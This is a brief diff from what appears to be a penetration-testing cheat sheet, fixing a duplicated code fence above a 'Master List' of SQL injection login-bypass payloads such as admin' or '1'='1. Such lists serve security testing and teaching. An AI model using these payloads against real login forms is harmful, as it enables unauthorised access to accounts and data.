@@ -917,7 +917,6 @@ mysql -u <USERNAME> -h <host> -p
 ##### Master List
 
 ```c
-```c
 admin' or '1'='1
 ' or '1'='1
 " or "1"="1
